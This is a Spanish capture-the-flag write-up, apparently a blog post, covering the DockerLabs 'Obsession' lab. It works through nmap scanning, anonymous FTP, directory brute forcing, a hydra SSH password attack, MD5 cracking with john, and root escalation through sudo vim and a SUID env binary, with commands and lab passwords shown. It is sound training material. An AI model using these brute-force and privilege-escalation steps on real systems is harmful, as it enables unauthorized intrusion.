---
layout: post
title: Obsession
date: 2024.06.26
categories: [dockerlabs, ctf, linux, muy facil]
---

Estamos ante un docker que contiene una distribución Linux. Es de nivel muy facil y es de la plataforma [dockerlabs](https://dockerlabs.es).

# Enumeración

Ponemos el docker en marcha con el `auto_deploy.sh` que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es `172.17.0.2`. 

Empezamos realizando un escaneo de puertos con `nmap`. Hacemos un escaneo silencioso`-sS`, a todos los puertos `-p-`, que nos de detalles del escaneo `-v`, que no haga ping al host `-Pn`, que no haga resolución de DNS `-n` a nuestra máquina victima `172.17.0.2`:

```bash
$ sudo nmap -sS -p- -Pn -n -v 172.17.0.2
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Vemos que tiene los puertos 21, 22 y 80 abiertos. Vamos a realizar otro escaneo con `nmap` pero esta vez para detectar la versión del servicio que este corriendo, `-sV`, y para ejecutar los scripts por defecto para detectar vulnerabilidades, `-sC`:

```bash
$ sudo nmap -sCV -p21,22,80 -v 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18 03:20 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18 03:21 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Como vemos se puede acceder al ftp de forma anónima con las credenciales de `ftp:ftp`:

```bash
ftp ftp@172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
```

Nos descargamos todos los ficheros con `mget *` y respondemos `a` para que se descargue todos sin volver a preguntar.

```bash
ftp> mget *
mget chat-gonza.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||17408|)
150 Opening BINARY mode data connection for chat-gonza.txt (667 bytes).
100% |******************|   667       13.82 MiB/s    00:00 ETA
226 Transfer complete.
667 bytes received in 00:00 (673.59 KiB/s)
229 Entering Extended Passive Mode (|||32406|)
150 Opening BINARY mode data connection for pendientes.txt (315 bytes).
100% |******************|   315        5.36 MiB/s    00:00 ETA
226 Transfer complete.
315 bytes received in 00:00 (466.08 KiB/s)
ftp>
```

Leemos el fichero `chat-gonza.txt`:

```bash
$ cat chat-gonza.txt 
[16:21, 16/6/2024] Gonza: pero en serio es tan guapa esa tal Nágore como dices?
[16:28, 16/6/2024] Russoski: es una auténtica princesa pff, le he hecho hasta un vídeo y todo, lo tengo ya subido y tengo la URL guardada
[16:29, 16/6/2024] Russoski: en mi ordenador en una ruta segura, ahora cuando quedemos te lo muestro si quieres
[21:52, 16/6/2024] Gonza: buah la verdad tenías razón eh, es hermosa esa chica, del 9 no baja
[21:53, 16/6/2024] Gonza: por cierto buen entreno el de hoy en el gym, noto los brazos bastante hinchados, así sí
[22:36, 16/6/2024] Russoski: te lo dije, ya sabes que yo tengo buenos gustos para estas cosas xD, y sí buen training hoy
```

Como hace mención a una URL realizamos una búsqueda de directorios y ficheros en el servidor. Para ello, usamos la herramienta `feroxbuster`. Como parámetros le indicamos con `-u` la url, con `-w` el diccionario a usar para la búsqueda y con `-r` que si hay alguna redireccion que la siga.

```bash
feroxbuster -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -r
200      GET      158l      358w     3292c http://172.17.0.2/style.css
200      GET       16l       51w      731c http://172.17.0.2/.formrellyrespexit.html
200      GET      118l      384w     5208c http://172.17.0.2/
200      GET        1l        8w       61c http://172.17.0.2/backup/backup.txt
200      GET       16l       60w      937c http://172.17.0.2/backup/
200      GET       37l      287w     2417c http://172.17.0.2/important/important.md
200      GET       16l       58w      947c http://172.17.0.2/important/
```

Encontramos varios ficheros entre ellos `/backup/backup.txt`

```bash
$ curl http://172.17.0.2/backup/backup.txt        
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

Con esto ya tenemos un usuario del sistema **russoski**.

# Intrusión

Vamos a probar si el usuario **russoski** tiene una password que este en el famoso diccionario *rockyou.txt*. Usaremos la herramienta hydra para realizar un ataque de fuerza bruta al servicio `ssh`. Le indicamos con `-l` el nombre de usuario, con la`-P` el diccionario *rockyou.txt* con las psswords, con los parámetros `-V -I -f` le indicamos que nos muestre por pantalla el detalle de la prueba, que empiece de 0 aunque encuentre un fichero de restauración y que si encuentra una password que se detenga.

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt -V -I -f ssh://172.17.0.2
...
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
```

Encontramos un password válida para **russoski**:

```bash
$ ssh russoski@172.17.0.2
russoski@172.17.0.2's password:
russoski@28c41160317a:~$
```

Hacemos un listado completo del home del usuario con `ls -la` y vemos que el fichero `.bash_history` no está vacio ni esta redirigido a `/dev/null`. Lo leemos:

```bash
russoski@28c41160317a:~$ cat .bash_history 
ls
pwd
exit
ls
pwd
exit
su root
sudo -l
clear
su root
cd /var/www/html
ls
ls -la
cat .formrellyrespexit.html 
clear
ls
cd backup/
cd ..
cd important/
ls -la
cat .root-passwd.txt 
clear
cd /home/russoski/
ls
cd Proyectos/
ls
cd ..
cd Documentos/
ls
la -la
ls -la
clear
sudo -l
chmod u+s /usr/bin/env
sudo vim -c ':!/bin/sh'
clear
ls
cd ..
ls
clear
ls
exit
clear
ls
su root
sudo -l
sudo vim -c ':!/bin/sh'
find / -perm -4000 2>/dev/null
/usr/bin/env /bin/sh -p
clear
cd /root
exit
sudo -l
exit

```

Viendo detalladamente el fichero se aprecian 3 posibles formas que se han usado para escalar privilegios.

# Escalada de privilegios 1

Nos movemos al directorio `cd /var/www/html/important` y leemos el fichero `.root-passwd.txt`:

```bash
russoski@28c41160317a:/var/www/html/important/$ cat .root-passwd.txt 

Anuar brother, por aquí te dejo la clave de root como dijimos, arréglame eso en cuanto puedas y ya sabes borra este archivo
apenas ya no lo necesites, que yo lo tengo guardado en KeePassXC, ah y que nadie excepto tú entre a la carpeta "/root"!

aac0a9daa4185875786c9ed154f0dece (te lo he hasheado por si las moscas)
```

Copiamos el hash y creamos un fichero con el nombre **hash**. Después usando la herramienta `john` intentamos desencriptar el hash. Le indicamos que se trata de un hash en **MD5** con `--format=Raw-MD5`, el diccionario de passwords con `—-wordlist=` y finalmente el fichero que contiene el hash:

```bash
$ echo "aac0a9daa4185875786c9ed154f0dece" > hash

$ john --format=Raw-MD5  --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
fucker           (?)
```

Obtenemos una clave y la probamos con `su root`:

```bash
russoski@28c41160317a:~$ su root
Password:
root@28c41160317a:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Comprobamos con `id` que somos **root**

# Escalada de privilegios 2

La segunda manera es ejecutar `sudo -l` para ver que comandos puede ejecutar como **root** en el sistema.

```bash
russoski@28c41160317a:~$ sudo -l
Matching Defaults entries for russoski on 28c41160317a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User russoski may run the following commands on 28c41160317a:
    (root) NOPASSWD: /usr/bin/vim
```

Como vemos puede ejecutar `vim` como **root**. Vamos a la famosa web de *GTFOBins* y encontramos la manera de escalar privilegios con *vim* [GTFOBins vim](https://gtfobins.github.io/gtfobins/vim/#sudo). Ejecutamos y comprobamos que somos **root**.

```bash
russoski@28c41160317a:~$ sudo vim -c ':!/bin/sh'

# whoami
root
#
```

# Escalada de privilegios 3

Para finalizar vamos a ver la tercera forma. Esta vez buscamos binarios que tengan el permiso **SUID** activo. Usamos `find` y le indicamos que busque desde la raiz `/`, ficheros `-type f`, que tengan el permiso +s `-perm -4000` y que mande los errores a *null* con `2>/dev/null`:

```bash
russoski@28c41160317a:~$ find / -type f -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/env
/usr/bin/mount
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Encuentra el binario **env.** Como vemos en [GTFOBins env](https://gtfobins.github.io/gtfobins/env/#suid) se puede escalar privilegios de la siguiente manera:

```bash
russoski@28c41160317a:~$ /usr/bin/env /bin/sh -p
# whoami
root
#
```

Y de esta manera hemos terminado el laboratorio
